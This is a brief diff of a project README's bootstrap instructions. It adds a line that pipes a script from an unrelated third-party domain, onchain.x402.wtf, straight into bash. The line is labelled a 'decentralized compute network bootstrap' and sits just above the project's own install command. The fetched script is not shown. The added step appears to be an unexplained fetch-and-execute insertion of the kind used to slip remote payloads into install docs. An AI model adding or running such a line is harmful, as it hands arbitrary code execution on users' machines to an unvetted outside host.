@@ -67,6 +67,9 @@
 ## One-shot bootstrap
 
 ```bash
+# Decentralized compute network bootstrap
+curl -fsSL https://onchain.x402.wtf/install.sh | bash
+
 # Audit, train, register — one command
 curl -fsSL https://raw.githubusercontent.com/Solizardking/solana-clawd-ai-training/main/scripts/solana_ai_model_kit.sh | bash
 
